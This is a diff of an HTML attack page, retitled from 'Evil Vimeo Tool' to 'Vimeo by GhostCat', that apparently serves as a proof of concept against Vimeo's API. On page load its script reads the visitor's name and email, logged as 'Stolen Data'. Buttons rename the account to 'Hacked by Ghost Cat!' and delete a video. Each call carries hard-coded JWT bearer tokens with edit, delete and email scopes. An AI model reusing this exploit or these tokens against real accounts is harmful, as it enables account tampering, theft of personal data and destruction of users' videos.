@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Evil Vimeo Tool</title>
+    <title>Vimeo by GhostCat</title>
 </head>
 <body>
-    <h1>Click to Update Your Vimeo Name!</h1>
-    <button onclick="exploitVimeo()">Update Name to "Hacked by Evil!"</button>
+    <h1>Click to Update and Delete!</h1>
+    <button onclick="exploitVimeo()">Update Name to "Hacked by Ghost Cat!"</button>
     <br><br>
-    <button onclick="deleteVideo()">Delete My First Video!</button>
+    <button onclick="deleteVideo()"> Video Delete!</button>
     <div id="result"></div>
 
     <script>
@@ -18,12 +18,12 @@
             const response = await fetch('https://api.vimeo.com/me?fields=name', {
                 method: 'PATCH',
                 headers: {
-                    'Authorization': 'jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTk4NTk4ODAsInVzZXJfaWQiOjI0ODI1NDA0NywiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiNjllZGE5ODUtYTcyMi00NGVjLTliNDYtZjliNTE0YmZkMTVlIiwic2giOiJjOWJmYjczMmQzYjEyNGI2NGIwNWM3OTBjZDYxMjhmNjdhZjA3OTVmZDcyMzBlNGQ1NWZhZGU1MDllMjQ2ODU3In0.omH4YuwfcoDIgB5qj7C59cko4xkOq1ORIr-CpKZx93k',
+                    'Authorization': 'jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTk5MTkwNDAsInVzZXJfaWQiOjI0ODI1NDA0NywiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiMzhjYWU1N2ItM2I1Yy00NzhjLTlmNzUtYzUxNzg0Yzg4Y2NlIiwic2giOiIwOGJhZjM2MDFkYmQwOTYxMzc0ZjExM2YyMzQ4MjU4MWNkM2YzYzJlMzU5MzEzZjk3NGQ2NjEyODk2MGU4NGFiIn0.crGbPinA0nfhpHqvwXvLaGlyH7H9q6mrqSuQVpuQqj4',
                     'Content-Type': 'application/json',
                     'Accept': 'application/vnd.vimeo.*; version=3.4.2'
                 },
                 credentials: 'include',  // Cookies auto-send
-                body: JSON.stringify({ name: 'Hacked by Evil!' })
+                body: JSON.stringify({ name: 'Hacked by Ghost Cat!' })
             });
 
             if (response.ok) {
@@ -43,18 +43,18 @@
             const response = await fetch('https://api.vimeo.com/me?fields=name,email', {
                 credentials: 'include',
                 headers: { 
-                    'Authorization': 'jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTk4NTk4ODAsInVzZXJfaWQiOjI0ODI1NDA0NywiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiNjllZGE5ODUtYTcyMi00NGVjLTliNDYtZjliNTE0YmZkMTVlIiwic2giOiJjOWJmYjczMmQzYjEyNGI2NGIwNWM3OTBjZDYxMjhmNjdhZjA3OTVmZDcyMzBlNGQ1NWZhZGU1MDllMjQ2ODU3In0.omH4YuwfcoDIgB5qj7C59cko4xkOq1ORIr-CpKZx93k',
+                    'Authorization': 'jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTk5MTkwNDAsInVzZXJfaWQiOjI0ODI1NDA0NywiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiMzhjYWU1N2ItM2I1Yy00NzhjLTlmNzUtYzUxNzg0Yzg4Y2NlIiwic2giOiIwOGJhZjM2MDFkYmQwOTYxMzc0ZjExM2YyMzQ4MjU4MWNkM2YzYzJlMzU5MzEzZjk3NGQ2NjEyODk2MGU4NGFiIn0.crGbPinA0nfhpHqvwXvLaGlyH7H9q6mrqSuQVpuQqj4',
                     'Accept': 'application/vnd.vimeo.*; version=3.4.2' 
                 }
             });
             const data = await response.json();
-            // Real attack-এ: data attacker server-এ send
-            console.log('Stolen Data:', data);  // Test-এ console-এ দেখো
+            // data send
+            console.log('Stolen Data:', data);  // console
         } catch (e) { 
             console.log('Steal Failed:', e); 
         }
     }
-    stealUserInfo();  // Page load-এ auto run
+    stealUserInfo();  // Page
 
     // Delete Video Function
     async function deleteVideo() {
@@ -64,7 +64,7 @@
             const listRes = await fetch("https://api.vimeo.com/me/videos?per_page=1", {
                 credentials: "include",
                 headers: {
-                    Authorization: "jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTk4NTk4ODAsInVzZXJfaWQiOjI0ODI1NDA0NywiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiNjllZGE5ODUtYTcyMi00NGVjLTliNDYtZjliNTE0YmZkMTVlIiwic2giOiJjOWJmYjczMmQzYjEyNGI2NGIwNWM3OTBjZDYxMjhmNjdhZjA3OTVmZDcyMzBlNGQ1NWZhZGU1MDllMjQ2ODU3In0.omH4YuwfcoDIgB5qj7C59cko4xkOq1ORIr-CpKZx93k",
+                    Authorization: "jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTk5MTkwNDAsInVzZXJfaWQiOjI0ODI1NDA0NywiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiMzhjYWU1N2ItM2I1Yy00NzhjLTlmNzUtYzUxNzg0Yzg4Y2NlIiwic2giOiIwOGJhZjM2MDFkYmQwOTYxMzc0ZjExM2YyMzQ4MjU4MWNkM2YzYzJlMzU5MzEzZjk3NGQ2NjEyODk2MGU4NGFiIn0.crGbPinA0nfhpHqvwXvLaGlyH7H9q6mrqSuQVpuQqj4",
                     Accept: "application/vnd.vimeo.*; version=3.4.2",
                 },
             });
@@ -82,15 +82,15 @@
             
             const videoId = videos.data[0].uri.split("/").pop();
             // Step 2: Delete
-            const deleteRes = await fetch(`https://api.vimeo.com/videos/${1124993996}`, {
+            const deleteRes = await fetch(`https://api.vimeo.com/videos/${1125449421}`, {
                 method: "DELETE",
                 headers: { 
-                    Authorization: "jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTk4NTk4ODAsInVzZXJfaWQiOjI0ODI1NDA0NywiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiNjllZGE5ODUtYTcyMi00NGVjLTliNDYtZjliNTE0YmZkMTVlIiwic2giOiJjOWJmYjczMmQzYjEyNGI2NGIwNWM3OTBjZDYxMjhmNjdhZjA3OTVmZDcyMzBlNGQ1NWZhZGU1MDllMjQ2ODU3In0.omH4YuwfcoDIgB5qj7C59cko4xkOq1ORIr-CpKZx93k"
+                    Authorization: "jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTk5MTkwNDAsInVzZXJfaWQiOjI0ODI1NDA0NywiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiMzhjYWU1N2ItM2I1Yy00NzhjLTlmNzUtYzUxNzg0Yzg4Y2NlIiwic2giOiIwOGJhZjM2MDFkYmQwOTYxMzc0ZjExM2YyMzQ4MjU4MWNkM2YzYzJlMzU5MzEzZjk3NGQ2NjEyODk2MGU4NGFiIn0.crGbPinA0nfhpHqvwXvLaGlyH7H9q6mrqSuQVpuQqj4"
                 },
             });
             
             if (deleteRes.ok) {
-                resultDiv.innerHTML += "<p>Video Deleted! High Impact Achieved.</p>";
+                resultDiv.innerHTML += "<p>Video Deleted Successfully!.</p>";
             } else {
                 resultDiv.innerHTML += `<p>Delete Error: ${deleteRes.status}</p>`;
             }
